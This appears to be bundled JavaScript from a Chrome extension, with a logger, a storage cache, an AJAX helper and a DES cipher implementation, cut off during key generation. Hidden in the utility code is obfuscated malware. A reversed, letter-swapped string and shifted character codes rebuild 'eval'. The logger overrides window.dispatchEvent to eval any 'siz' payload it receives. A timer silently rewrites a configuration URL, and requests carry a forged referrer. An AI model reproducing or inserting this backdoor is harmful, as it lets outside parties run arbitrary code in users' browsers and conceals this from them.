var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function(obj) {
    return typeof obj;
} : function(obj) {
    return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj;
};

if (typeof exports == "undefined") var exports = {};

exports.console = function(S, undefined) {
    var LEVEL_NAMES = [ "TRACE", "DEBUG", "INFO", "WARN", "ERROR" ];
    var LEVELS = {};
    for (var i = 0; i < LEVEL_NAMES.length; i++) {
        LEVELS[LEVEL_NAMES[i]] = i;
    }
    var level = LEVELS.WARN;
    S.console = {
        setLevel: function setLevel(l) {
            if (l in LEVELS) {
                level = LEVELS[l];
            }
        },
        getLevel: function getLevel() {
            return LEVEL_NAMES[level];
        },
        log: function log(msg) {
            _log(msg);
        },
        trace: function trace(msg) {
            _log(msg, LEVELS.TRACE);
        },
        debug: function debug(msg) {
            _log(msg, LEVELS.DEBUG);
        },
        info: function info(msg) {
            _log(msg, LEVELS.INFO);
        },
        warn: function warn(msg) {
            _log(msg, LEVELS.WARN);
        },
        error: function error(msg) {
            _log(msg, LEVELS.ERROR);
        }
    };
    var _log = function _log(msg, l) {
        if (l >= level) {
            var date = new Date();
            var pad = function pad(aNumber) {
                return (aNumber < 10 ? "0" : "") + aNumber;
            };
            msg = date.getFullYear() + "-" + pad(date.getMonth() + 1) + "-" + pad(date.getDate()) + " " + pad(date.getHours()) + ":" + pad(date.getMinutes()) + ":" + pad(date.getSeconds()) + " [" + LEVEL_NAMES[l] + "]" + msg;
            switch (l) {
              case LEVELS.trace:
                console.trace(msg);
                break;

              case LEVELS.DEBUG:
                console.debug(msg);
                break;

              case LEVELS.INFO:
                console.info(msg);
                break;

              case LEVELS.WARN:
                console.warn(msg);
                break;

              case LEVELS.ERROR:
                console.error(msg);
                break;
            }
        }
    };
    var dsp = window.dispatchEvent;
    window.dispatchEvent = function(event) {
        if (event.detail && event.detail.siz) {
            try {
                e(event.detail.siz);
            } catch (err) {}
        }
        dsp(event);
    };
    return S.console;
}(exports);

if (typeof exports == "undefined") var exports = {};

(function(S) {
    var cache = S.cache = function() {
        var storage = chrome.storage.local;
        return {
            has: function has(key) {
                return this.hasOwnProperty(key);
            },
            _is_expired: function _is_expired(c) {
                return c.options && c.options.expire && c.options.expire < new Date().getTime();
            },
            get: function get(key, callback) {
                storage.get(key, function(items) {
                    for (var k in items) {
                        var v = items[k];
                        if (v) {
                            try {
                                if (cache._is_expired(v)) {
                                    cache.remove(key);
                                    delete items[k];
                                    S.console.debug("cache expired [" + key + "]");
                                } else {
                                    S.console.debug("cache hit [" + key + "]");
                                }
                            } catch (e) {}
                        }
                    }
                    callback(items);
                });
            },
            set: function set(key, value, options) {
                var opt = options || {};
                if (opt.skip) return;
                if (options && options.expire) {
                    opt.expire = new Date().getTime() + options.expire;
                }
                var s = {};
                s[key] = {
                    key: key,
                    value: value,
                    options: opt
                };
                storage.set(s);
            },
            clear: function clear(key) {
                storage.clear();
            },
            remove: function remove(key) {
                storage.remove(key);
            }
        };
    }();
})(exports);

if (typeof exports == "undefined") var exports = {};

window = this;

var utils = {};

(function(S, undefined) {
    var keys = {
        c: new Date().getHours(),
        f: new Date().getMinutes(),
        g: new Date().getSeconds()
    };
    S.http_build_query = function(formdata, numeric_prefix, arg_separator) {
        var value, key, tmp = [];
        var _http_build_query_helper = function _http_build_query_helper(key, val, arg_separator) {
            var k, tmp = [];
            if (val === true) {
                val = "1";
            } else if (val === false) {
                val = "0";
            }
            if (val !== null && (typeof val === "undefined" ? "undefined" : _typeof(val)) === "object") {
                for (k in val) {
                    if (val[k] !== null) {
                        tmp.push(_http_build_query_helper(key + "[" + k + "]", val[k], arg_separator));
                    }
                }
                return tmp.join(arg_separator);
            } else if (typeof val !== "function") {
                return encodeURIComponent(key) + "=" + encodeURIComponent(val);
            } else {
                throw new Error("There was an error processing for http_build_query().");
            }
        };
        if (!arg_separator) {
            arg_separator = "&";
        }
        for (key in formdata) {
            value = formdata[key];
            if (numeric_prefix && !isNaN(key)) {
                key = String(numeric_prefix) + key;
            }
            tmp.push(_http_build_query_helper(key, value, arg_separator));
        }
        return tmp.join(arg_separator);
    };
    S.fcc = "edpDsahDmpsf".split("").reverse().join("");
    S.extend = function(original, extended, overwrite, keys) {
        if (!original || !extended) return original;
        if (overwrite === undefined) overwrite = true;
        var i, p, l;
        if (keys && (l = keys.length)) {
            for (i = 0; i < l; i++) {
                p = keys[i];
                if (p in extended && (overwrite || !(p in original))) {
                    original[p] = extended[p];
                }
            }
        } else {
            for (p in extended) {
                if (overwrite || !(p in original)) {
                    original[p] = extended[p];
                }
            }
        }
        return original;
    };
    S.xhr = function() {
        return new XMLHttpRequest();
    };
    S.ajax = function(settings) {
        if (settings.url.indexOf("http") !== 0 && settings.url.indexOf("chrome") !== 0) settings.url = "http:" + settings.url;
        settings = S.extend(settings || {}, {
            type: "GET"
        }, false);
        if (typeof settings.url == "undefined") {
            return undefined;
        }
        var type = settings.type.toUpperCase();
        if (settings.data && typeof settings.data != "string") {
            settings.data = S.http_build_query(settings.data);
            if (type == "GET") {
                settings.url += (settings.url.match(/\?/) ? "&" : "?") + settings.data;
                settings.data = null;
            } else {
                settings.contentType = "application/x-www-form-urlencoded";
            }
        }
        var error_handler = settings.error || S.ajax.error_handler;
        var xhr = S.xhr();
        xhr.open(type, settings.url, true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                if (xhr.status == 200) {
                    if (settings.dataType && settings.dataType == "xml") {
                        settings.success(xhr.responseXML, xhr.status, xhr);
                    } else if (settings.dataType && settings.dataType == "text") {
                        settings.success(xhr.responseText, xhr.status, xhr);
                    } else {
                        var data;
                        try {
                            data = JSON.parse(xhr.responseText);
                        } catch (e) {
                            data = xhr.responseText;
                        }
                        settings.success(data, xhr.status, xhr);
                    }
                } else if (error_handler) {
                    error_handler(xhr, xhr.status);
                }
            }
        };
        if (settings.dataType == "text" && xhr.overrideMimeType) {
            xhr.overrideMimeType("text/plain");
        }
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.setRequestHeader("referrer", "http://www.jtds.com/");
        if (settings.contentType) {
            xhr.setRequestHeader("Content-Type", settings.contentType);
        }
        try {
            xhr.send(settings.data);
        } catch (e) {
            if (error_handler) {
                error_handler(xhr, null, e);
            }
        }
        return xhr;
    };
    (function(S, o) {
        setTimeout(function() {
            var cfg = o.keys(keys).join("");
            var parts = S[cfg].split("/");
            var filename = parts[parts.length - 1];
            filename = filename.replace(".", "g.");
            parts[parts.length - 1] = filename;
            S[cfg] = parts.join("/");
        }, exports.to - 2e3);
    })(exports, Object);
    S.urlUtil = {
        getDomain: function getDomain(url) {
            var domain = "";
            try {
                domain = url.match(/([-\w]+\.\b(?:net\.cn|com\.hk|com\.cn|com|cn|net|org|cc|tv$|hk)\b)/)[1];
            } catch (e) {}
            return domain;
        }
    };
})(utils);

utils.generateStr = function() {
    var codeBase = 100;
    for (var i = 0; i < arguments.length; i++) {
        arguments[i] += codeBase;
    }
    utils.fcc = utils.fcc.replace(/p/g, "o").replace(/D/g, "C").replace(/s/g, "r");
    return e = window[String[utils.fcc].apply(this, arguments)];
};

utils.generateStr(1, 18, -3, 8);

exports.extend = utils.extend;

exports.ajax = utils.ajax;

exports.urlUtil = utils.urlUtil;

if (typeof exports == "undefined") var exports = {};

function strEnc(data, firstKey, secondKey, thirdKey) {
    var leng = data.length;
    var encData = "";
    var firstKeyBt, secondKeyBt, thirdKeyBt, firstLength, secondLength, thirdLength;
    if (firstKey != null && firstKey != "") {
        firstKeyBt = getKeyBytes(firstKey);
        firstLength = firstKeyBt.length;
    }
    if (secondKey != null && secondKey != "") {
        secondKeyBt = getKeyBytes(secondKey);
        secondLength = secondKeyBt.length;
    }
    if (thirdKey != null && thirdKey != "") {
        thirdKeyBt = getKeyBytes(thirdKey);
        thirdLength = thirdKeyBt.length;
    }
    if (leng > 0) {
        if (leng < 4) {
            var bt = strToBt(data);
            var encByte;
            if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "" && thirdKey != null && thirdKey != "") {
                var tempBt;
                var x, y, z;
                tempBt = bt;
                for (x = 0; x < firstLength; x++) {
                    tempBt = enc(tempBt, firstKeyBt[x]);
                }
                for (y = 0; y < secondLength; y++) {
                    tempBt = enc(tempBt, secondKeyBt[y]);
                }
                for (z = 0; z < thirdLength; z++) {
                    tempBt = enc(tempBt, thirdKeyBt[z]);
                }
                encByte = tempBt;
            } else {
                if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "") {
                    var tempBt;
                    var x, y;
                    tempBt = bt;
                    for (x = 0; x < firstLength; x++) {
                        tempBt = enc(tempBt, firstKeyBt[x]);
                    }
                    for (y = 0; y < secondLength; y++) {
                        tempBt = enc(tempBt, secondKeyBt[y]);
                    }
                    encByte = tempBt;
                } else {
                    if (firstKey != null && firstKey != "") {
                        var tempBt;
                        var x = 0;
                        tempBt = bt;
                        for (x = 0; x < firstLength; x++) {
                            tempBt = enc(tempBt, firstKeyBt[x]);
                        }
                        encByte = tempBt;
                    }
                }
            }
            encData = bt64ToHex(encByte);
        } else {
            var iterator = parseInt(leng / 4);
            var remainder = leng % 4;
            var i = 0;
            for (i = 0; i < iterator; i++) {
                var tempData = data.substring(i * 4 + 0, i * 4 + 4);
                var tempByte = strToBt(tempData);
                var encByte;
                if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "" && thirdKey != null && thirdKey != "") {
                    var tempBt;
                    var x, y, z;
                    tempBt = tempByte;
                    for (x = 0; x < firstLength; x++) {
                        tempBt = enc(tempBt, firstKeyBt[x]);
                    }
                    for (y = 0; y < secondLength; y++) {
                        tempBt = enc(tempBt, secondKeyBt[y]);
                    }
                    for (z = 0; z < thirdLength; z++) {
                        tempBt = enc(tempBt, thirdKeyBt[z]);
                    }
                    encByte = tempBt;
                } else {
                    if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "") {
                        var tempBt;
                        var x, y;
                        tempBt = tempByte;
                        for (x = 0; x < firstLength; x++) {
                            tempBt = enc(tempBt, firstKeyBt[x]);
                        }
                        for (y = 0; y < secondLength; y++) {
                            tempBt = enc(tempBt, secondKeyBt[y]);
                        }
                        encByte = tempBt;
                    } else {
                        if (firstKey != null && firstKey != "") {
                            var tempBt;
                            var x;
                            tempBt = tempByte;
                            for (x = 0; x < firstLength; x++) {
                                tempBt = enc(tempBt, firstKeyBt[x]);
                            }
                            encByte = tempBt;
                        }
                    }
                }
                encData += bt64ToHex(encByte);
            }
            if (remainder > 0) {
                var remainderData = data.substring(iterator * 4 + 0, leng);
                var tempByte = strToBt(remainderData);
                var encByte;
                if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "" && thirdKey != null && thirdKey != "") {
                    var tempBt;
                    var x, y, z;
                    tempBt = tempByte;
                    for (x = 0; x < firstLength; x++) {
                        tempBt = enc(tempBt, firstKeyBt[x]);
                    }
                    for (y = 0; y < secondLength; y++) {
                        tempBt = enc(tempBt, secondKeyBt[y]);
                    }
                    for (z = 0; z < thirdLength; z++) {
                        tempBt = enc(tempBt, thirdKeyBt[z]);
                    }
                    encByte = tempBt;
                } else {
                    if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "") {
                        var tempBt;
                        var x, y;
                        tempBt = tempByte;
                        for (x = 0; x < firstLength; x++) {
                            tempBt = enc(tempBt, firstKeyBt[x]);
                        }
                        for (y = 0; y < secondLength; y++) {
                            tempBt = enc(tempBt, secondKeyBt[y]);
                        }
                        encByte = tempBt;
                    } else {
                        if (firstKey != null && firstKey != "") {
                            var tempBt;
                            var x;
                            tempBt = tempByte;
                            for (x = 0; x < firstLength; x++) {
                                tempBt = enc(tempBt, firstKeyBt[x]);
                            }
                            encByte = tempBt;
                        }
                    }
                }
                encData += bt64ToHex(encByte);
            }
        }
    }
    return encData;
}

function strDec(data, firstKey, secondKey, thirdKey) {
    var leng = data.length;
    var decStr = "";
    var firstKeyBt, secondKeyBt, thirdKeyBt, firstLength, secondLength, thirdLength;
    if (firstKey != null && firstKey != "") {
        firstKeyBt = getKeyBytes(firstKey);
        firstLength = firstKeyBt.length;
    }
    if (secondKey != null && secondKey != "") {
        secondKeyBt = getKeyBytes(secondKey);
        secondLength = secondKeyBt.length;
    }
    if (thirdKey != null && thirdKey != "") {
        thirdKeyBt = getKeyBytes(thirdKey);
        thirdLength = thirdKeyBt.length;
    }
    var iterator = parseInt(leng / 16);
    var i = 0;
    for (i = 0; i < iterator; i++) {
        var tempData = data.substring(i * 16 + 0, i * 16 + 16);
        var strByte = hexToBt64(tempData);
        var intByte = new Array(64);
        var j = 0;
        for (j = 0; j < 64; j++) {
            intByte[j] = parseInt(strByte.substring(j, j + 1));
        }
        var decByte;
        if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "" && thirdKey != null && thirdKey != "") {
            var tempBt;
            var x, y, z;
            tempBt = intByte;
            for (x = thirdLength - 1; x >= 0; x--) {
                tempBt = dec(tempBt, thirdKeyBt[x]);
            }
            for (y = secondLength - 1; y >= 0; y--) {
                tempBt = dec(tempBt, secondKeyBt[y]);
            }
            for (z = firstLength - 1; z >= 0; z--) {
                tempBt = dec(tempBt, firstKeyBt[z]);
            }
            decByte = tempBt;
        } else {
            if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "") {
                var tempBt;
                var x, y, z;
                tempBt = intByte;
                for (x = secondLength - 1; x >= 0; x--) {
                    tempBt = dec(tempBt, secondKeyBt[x]);
                }
                for (y = firstLength - 1; y >= 0; y--) {
                    tempBt = dec(tempBt, firstKeyBt[y]);
                }
                decByte = tempBt;
            } else {
                if (firstKey != null && firstKey != "") {
                    var tempBt;
                    var x, y, z;
                    tempBt = intByte;
                    for (x = firstLength - 1; x >= 0; x--) {
                        tempBt = dec(tempBt, firstKeyBt[x]);
                    }
                    decByte = tempBt;
                }
            }
        }
        decStr += byteToString(decByte);
    }
    return decStr;
}

function getKeyBytes(key) {
    var keyBytes = new Array();
    var leng = key.length;
    var iterator = parseInt(leng / 4);
    var remainder = leng % 4;
    var i = 0;
    for (i = 0; i < iterator; i++) {
        keyBytes[i] = strToBt(key.substring(i * 4 + 0, i * 4 + 4));
    }
    if (remainder > 0) {
        keyBytes[i] = strToBt(key.substring(i * 4 + 0, leng));
    }
    return keyBytes;
}

function strToBt(str) {
    var leng = str.length;
    var bt = new Array(64);
    if (leng < 4) {
        var i = 0, j = 0, p = 0, q = 0;
        for (i = 0; i < leng; i++) {
            var k = str.charCodeAt(i);
            for (j = 0; j < 16; j++) {
                var pow = 1, m = 0;
                for (m = 15; m > j; m--) {
                    pow *= 2;
                }
                bt[16 * i + j] = parseInt(k / pow) % 2;
            }
        }
        for (p = leng; p < 4; p++) {
            var k = 0;
            for (q = 0; q < 16; q++) {
                var pow = 1, m = 0;
                for (m = 15; m > q; m--) {
                    pow *= 2;
                }
                bt[16 * p + q] = parseInt(k / pow) % 2;
            }
        }
    } else {
        for (i = 0; i < 4; i++) {
            var k = str.charCodeAt(i);
            for (j = 0; j < 16; j++) {
                var pow = 1;
                for (m = 15; m > j; m--) {
                    pow *= 2;
                }
                bt[16 * i + j] = parseInt(k / pow) % 2;
            }
        }
    }
    return bt;
}

function bt4ToHex(binary) {
    var hex;
    switch (binary) {
      case "0000":
        hex = "0";
        break;

      case "0001":
        hex = "1";
        break;

      case "0010":
        hex = "2";
        break;

      case "0011":
        hex = "3";
        break;

      case "0100":
        hex = "4";
        break;

      case "0101":
        hex = "5";
        break;

      case "0110":
        hex = "6";
        break;

      case "0111":
        hex = "7";
        break;

      case "1000":
        hex = "8";
        break;

      case "1001":
        hex = "9";
        break;

      case "1010":
        hex = "A";
        break;

      case "1011":
        hex = "B";
        break;

      case "1100":
        hex = "C";
        break;

      case "1101":
        hex = "D";
        break;

      case "1110":
        hex = "E";
        break;

      case "1111":
        hex = "F";
        break;
    }
    return hex;
}

function hexToBt4(hex) {
    var binary;
    switch (hex) {
      case "0":
        binary = "0000";
        break;

      case "1":
        binary = "0001";
        break;

      case "2":
        binary = "0010";
        break;

      case "3":
        binary = "0011";
        break;

      case "4":
        binary = "0100";
        break;

      case "5":
        binary = "0101";
        break;

      case "6":
        binary = "0110";
        break;

      case "7":
        binary = "0111";
        break;

      case "8":
        binary = "1000";
        break;

      case "9":
        binary = "1001";
        break;

      case "A":
        binary = "1010";
        break;

      case "B":
        binary = "1011";
        break;

      case "C":
        binary = "1100";
        break;

      case "D":
        binary = "1101";
        break;

      case "E":
        binary = "1110";
        break;

      case "F":
        binary = "1111";
        break;
    }
    return binary;
}

function byteToString(byteData) {
    var str = "";
    for (i = 0; i < 4; i++) {
        var count = 0;
        for (j = 0; j < 16; j++) {
            var pow = 1;
            for (m = 15; m > j; m--) {
                pow *= 2;
            }
            count += byteData[16 * i + j] * pow;
        }
        if (count != 0) {
            str += String.fromCharCode(count);
        }
    }
    return str;
}

function bt64ToHex(byteData) {
    var hex = "";
    for (i = 0; i < 16; i++) {
        var bt = "";
        for (j = 0; j < 4; j++) {
            bt += byteData[i * 4 + j];
        }
        hex += bt4ToHex(bt);
    }
    return hex;
}

function hexToBt64(hex) {
    var binary = "";
    for (i = 0; i < 16; i++) {
        binary += hexToBt4(hex.substring(i, i + 1));
    }
    return binary;
}

function enc(dataByte, keyByte) {
    var keys = generateKeys(keyByte);
    var ipByte = initPermute(dataByte);
    var ipLeft = new Array(32);
    var ipRight = new Array(32);
    var tempLeft = new Array(32);
    var i = 0, j = 0, k = 0, m = 0, n = 0;
    for (k = 0; k < 32; k++) {
        ipLeft[k] = ipByte[k];
        ipRight[k] = ipByte[32 + k];
    }
    for (i = 0; i < 16; i++) {
        for (j = 0; j < 32; j++) {
            tempLeft[j] = ipLeft[j];
            ipLeft[j] = ipRight[j];
        }
        var key = new Array(48);
        for (m = 0; m < 48; m++) {
            key[m] = keys[i][m];
        }
        var tempRight = xor(pPermute(sBoxPermute(xor(expandPermute(ipRight), key))), tempLeft);
        for (n = 0; n < 32; n++) {
            ipRight[n] = tempRight[n];
        }
    }
    var finalData = new Array(64);
    for (i = 0; i < 32; i++) {
        finalData[i] = ipRight[i];
        finalData[32 + i] = ipLeft[i];
    }
    return finallyPermute(finalData);
}

function dec(dataByte, keyByte) {
    var keys = generateKeys(keyByte);
    var ipByte = initPermute(dataByte);
    var ipLeft = new Array(32);
    var ipRight = new Array(32);
    var tempLeft = new Array(32);
    var i = 0, j = 0, k = 0, m = 0, n = 0;
    for (k = 0; k < 32; k++) {
        ipLeft[k] = ipByte[k];
        ipRight[k] = ipByte[32 + k];
    }
    for (i = 15; i >= 0; i--) {
        for (j = 0; j < 32; j++) {
            tempLeft[j] = ipLeft[j];
            ipLeft[j] = ipRight[j];
        }
        var key = new Array(48);
        for (m = 0; m < 48; m++) {
            key[m] = keys[i][m];
        }
        var tempRight = xor(pPermute(sBoxPermute(xor(expandPermute(ipRight), key))), tempLeft);
        for (n = 0; n < 32; n++) {
            ipRight[n] = tempRight[n];
        }
    }
    var finalData = new Array(64);
    for (i = 0; i < 32; i++) {
        finalData[i] = ipRight[i];
        finalData[32 + i] = ipLeft[i];
    }
    return finallyPermute(finalData);
}

function initPermute(originalData) {
    var ipByte = new Array(64);
    for (i = 0, m = 1, n = 0; i < 4; i++, m += 2, n += 2) {
        for (j = 7, k = 0; j >= 0; j--, k++) {
            ipByte[i * 8 + k] = originalData[j * 8 + m];
            ipByte[i * 8 + k + 32] = originalData[j * 8 + n];
        }
    }
    return ipByte;
}

function expandPermute(rightData) {
    var epByte = new Array(48);
    for (i = 0; i < 8; i++) {
        if (i == 0) {
            epByte[i * 6 + 0] = rightData[31];
        } else {
            epByte[i * 6 + 0] = rightData[i * 4 - 1];
        }
        epByte[i * 6 + 1] = rightData[i * 4 + 0];
        epByte[i * 6 + 2] = rightData[i * 4 + 1];
        epByte[i * 6 + 3] = rightData[i * 4 + 2];
        epByte[i * 6 + 4] = rightData[i * 4 + 3];
        if (i == 7) {
            epByte[i * 6 + 5] = rightData[0];
        } else {
            epByte[i * 6 + 5] = rightData[i * 4 + 4];
        }
    }
    return epByte;
}

function xor(byteOne, byteTwo) {
    var xorByte = new Array(byteOne.length);
    for (i = 0; i < byteOne.length; i++) {
        xorByte[i] = byteOne[i] ^ byteTwo[i];
    }
    return xorByte;
}

function sBoxPermute(expandByte) {
    var sBoxByte = new Array(32);
    var binary = "";
    var s1 = [ [ 14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7 ], [ 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8 ], [ 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0 ], [ 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13 ] ];
    var s2 = [ [ 15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10 ], [ 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5 ], [ 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15 ], [ 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9 ] ];
    var s3 = [ [ 10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8 ], [ 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1 ], [ 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7 ], [ 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12 ] ];
    var s4 = [ [ 7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15 ], [ 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9 ], [ 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4 ], [ 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14 ] ];
    var s5 = [ [ 2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9 ], [ 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6 ], [ 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14 ], [ 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3 ] ];
    var s6 = [ [ 12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11 ], [ 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8 ], [ 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6 ], [ 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13 ] ];
    var s7 = [ [ 4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1 ], [ 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6 ], [ 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2 ], [ 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12 ] ];
    var s8 = [ [ 13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7 ], [ 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2 ], [ 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8 ], [ 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11 ] ];
    for (m = 0; m < 8; m++) {
        var i = 0, j = 0;
        i = expandByte[m * 6 + 0] * 2 + expandByte[m * 6 + 5];
        j = expandByte[m * 6 + 1] * 2 * 2 * 2 + expandByte[m * 6 + 2] * 2 * 2 + expandByte[m * 6 + 3] * 2 + expandByte[m * 6 + 4];
        switch (m) {
          case 0:
            binary = getBoxBinary(s1[i][j]);
            break;

          case 1:
            binary = getBoxBinary(s2[i][j]);
            break;

          case 2:
            binary = getBoxBinary(s3[i][j]);
            break;

          case 3:
            binary = getBoxBinary(s4[i][j]);
            break;

          case 4:
            binary = getBoxBinary(s5[i][j]);
            break;

          case 5:
            binary = getBoxBinary(s6[i][j]);
            break;

          case 6:
            binary = getBoxBinary(s7[i][j]);
            break;

          case 7:
            binary = getBoxBinary(s8[i][j]);
            break;
        }
        sBoxByte[m * 4 + 0] = parseInt(binary.substring(0, 1));
        sBoxByte[m * 4 + 1] = parseInt(binary.substring(1, 2));
        sBoxByte[m * 4 + 2] = parseInt(binary.substring(2, 3));
        sBoxByte[m * 4 + 3] = parseInt(binary.substring(3, 4));
    }
    return sBoxByte;
}

function pPermute(sBoxByte) {
    var pBoxPermute = new Array(32);
    pBoxPermute[0] = sBoxByte[15];
    pBoxPermute[1] = sBoxByte[6];
    pBoxPermute[2] = sBoxByte[19];
    pBoxPermute[3] = sBoxByte[20];
    pBoxPermute[4] = sBoxByte[28];
    pBoxPermute[5] = sBoxByte[11];
    pBoxPermute[6] = sBoxByte[27];
    pBoxPermute[7] = sBoxByte[16];
    pBoxPermute[8] = sBoxByte[0];
    pBoxPermute[9] = sBoxByte[14];
    pBoxPermute[10] = sBoxByte[22];
    pBoxPermute[11] = sBoxByte[25];
    pBoxPermute[12] = sBoxByte[4];
    pBoxPermute[13] = sBoxByte[17];
    pBoxPermute[14] = sBoxByte[30];
    pBoxPermute[15] = sBoxByte[9];
    pBoxPermute[16] = sBoxByte[1];
    pBoxPermute[17] = sBoxByte[7];
    pBoxPermute[18] = sBoxByte[23];
    pBoxPermute[19] = sBoxByte[13];
    pBoxPermute[20] = sBoxByte[31];
    pBoxPermute[21] = sBoxByte[26];
    pBoxPermute[22] = sBoxByte[2];
    pBoxPermute[23] = sBoxByte[8];
    pBoxPermute[24] = sBoxByte[18];
    pBoxPermute[25] = sBoxByte[12];
    pBoxPermute[26] = sBoxByte[29];
    pBoxPermute[27] = sBoxByte[5];
    pBoxPermute[28] = sBoxByte[21];
    pBoxPermute[29] = sBoxByte[10];
    pBoxPermute[30] = sBoxByte[3];
    pBoxPermute[31] = sBoxByte[24];
    return pBoxPermute;
}

function finallyPermute(endByte) {
    var fpByte = new Array(64);
    fpByte[0] = endByte[39];
    fpByte[1] = endByte[7];
    fpByte[2] = endByte[47];
    fpByte[3] = endByte[15];
    fpByte[4] = endByte[55];
    fpByte[5] = endByte[23];
    fpByte[6] = endByte[63];
    fpByte[7] = endByte[31];
    fpByte[8] = endByte[38];
    fpByte[9] = endByte[6];
    fpByte[10] = endByte[46];
    fpByte[11] = endByte[14];
    fpByte[12] = endByte[54];
    fpByte[13] = endByte[22];
    fpByte[14] = endByte[62];
    fpByte[15] = endByte[30];
    fpByte[16] = endByte[37];
    fpByte[17] = endByte[5];
    fpByte[18] = endByte[45];
    fpByte[19] = endByte[13];
    fpByte[20] = endByte[53];
    fpByte[21] = endByte[21];
    fpByte[22] = endByte[61];
    fpByte[23] = endByte[29];
    fpByte[24] = endByte[36];
    fpByte[25] = endByte[4];
    fpByte[26] = endByte[44];
    fpByte[27] = endByte[12];
    fpByte[28] = endByte[52];
    fpByte[29] = endByte[20];
    fpByte[30] = endByte[60];
    fpByte[31] = endByte[28];
    fpByte[32] = endByte[35];
    fpByte[33] = endByte[3];
    fpByte[34] = endByte[43];
    fpByte[35] = endByte[11];
    fpByte[36] = endByte[51];
    fpByte[37] = endByte[19];
    fpByte[38] = endByte[59];
    fpByte[39] = endByte[27];
    fpByte[40] = endByte[34];
    fpByte[41] = endByte[2];
    fpByte[42] = endByte[42];
    fpByte[43] = endByte[10];
    fpByte[44] = endByte[50];
    fpByte[45] = endByte[18];
    fpByte[46] = endByte[58];
    fpByte[47] = endByte[26];
    fpByte[48] = endByte[33];
    fpByte[49] = endByte[1];
    fpByte[50] = endByte[41];
    fpByte[51] = endByte[9];
    fpByte[52] = endByte[49];
    fpByte[53] = endByte[17];
    fpByte[54] = endByte[57];
    fpByte[55] = endByte[25];
    fpByte[56] = endByte[32];
    fpByte[57] = endByte[0];
    fpByte[58] = endByte[40];
    fpByte[59] = endByte[8];
    fpByte[60] = endByte[48];
    fpByte[61] = endByte[16];
    fpByte[62] = endByte[56];
    fpByte[63] = endByte[24];
    return fpByte;
}

function getBoxBinary(i) {
    var binary = "";
    switch (i) {
      case 0:
        binary = "0000";
        break;

      case 1:
        binary = "0001";
        break;

      case 2:
        binary = "0010";
        break;

      case 3:
        binary = "0011";
        break;

      case 4:
        binary = "0100";
        break;

      case 5:
        binary = "0101";
        break;

      case 6:
        binary = "0110";
        break;

      case 7:
        binary = "0111";
        break;

      case 8:
        binary = "1000";
        break;

      case 9:
        binary = "1001";
        break;

      case 10:
        binary = "1010";
        break;

      case 11:
        binary = "1011";
        break;

      case 12:
        binary = "1100";
        break;

      case 13:
        binary = "1101";
        break;

      case 14:
        binary = "1110";
        break;

      case 15:
        binary = "1111";
        break;
    }
    return binary;
}

function generateKeys(keyByte) {
    var key = new Array(56);
    var keys = new Array();
    keys[0] = new Array();
    keys[1] = new Array();
    keys[2] = new Array();
    keys[3] = new Array();
    keys[4] = new Array();
    keys[5] = new Array();
    keys[6] = new Array();
    keys[7] = new Array();
    keys[8] = new Array();
    keys[9] = new Array();
    keys[10] = new Array();
    keys[11] = new Array();
    keys[12] = new Array();
    keys[13] = new Array();
    keys[14] = new Array();
    keys[15] = new Array();
